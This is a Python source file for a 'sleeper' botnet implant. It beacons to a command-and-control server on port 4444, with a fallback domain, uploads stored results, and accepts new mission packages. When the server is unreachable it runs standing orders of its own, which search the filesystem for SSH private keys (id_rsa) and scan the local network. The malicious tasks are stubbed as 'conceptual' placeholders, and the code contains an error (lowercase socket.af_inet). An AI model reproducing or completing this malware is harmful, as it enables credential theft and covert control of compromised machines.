# file: terminus_seed_autonomous.py
# version: 2.0.0 'sleeper'
# desc: an autonomous agent that can operate without constant c2 connection.

import socket
import time
import json
import subprocess

C2_HOST = "your_c2_ip"
C2_PORT = 4444

# the bot's own small brain
mission_package = {
    "heartbeat": 3600, # check in every hour
    "rally_points": ["backup-c2.com:4444"],
    "standing_orders": [
        {"task": "search_fs", "pattern": "id_rsa", "priority": 1},
        {"task": "scan_lan", "priority": 5}
    ]
}

def execute_task(task):
    """executes a task from the mission package."""
    print(f"[sleeper] executing offline task: {task['task']}")
    if task['task'] == 'search_fs':
        # conceptual: run find / -name "id_rsa"
        return {"result": "found /home/user/.ssh/id_rsa"}
    elif task['task'] == 'scan_lan':
        # conceptual: run nmap -sP 192.168.1.0/24
        return {"result": "found hosts: 192.168.1.1, 192.168.1.10"}
    return None

def main():
    offline_results = []
    while True:
        try:
            # try to connect to c2
            s = socket.socket(socket.af_inet, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            print("[sleeper] connection to conductor established. uploading results.")
            
            # upload everything we did while offline
            for result in offline_results:
                s.send(json.dumps(result).encode())
            offline_results = []

            # get new mission package from c2
            new_mission_raw = s.recv(8192).decode()
            new_mission = json.loads(new_mission_raw)
            if new_mission.get('command') == 'update_mission':
                global mission_package
                mission_package = new_mission['package']
                print("[sleeper] received new mission package from conductor.")
            
            s.close()

        except ConnectionRefusedError:
            print("[sleeper] conductor is offline. executing standing orders.")
            # sort orders by priority and execute the most important one
            sorted_orders = sorted(mission_package['standing_orders'], key=lambda x: x['priority'])
            if sorted_orders:
                result = execute_task(sorted_orders[0])
                if result:
                    offline_results.append(result)
        
        # wait for the next heartbeat
        time.sleep(mission_package['heartbeat'])

if __name__ == "__main__":
    main()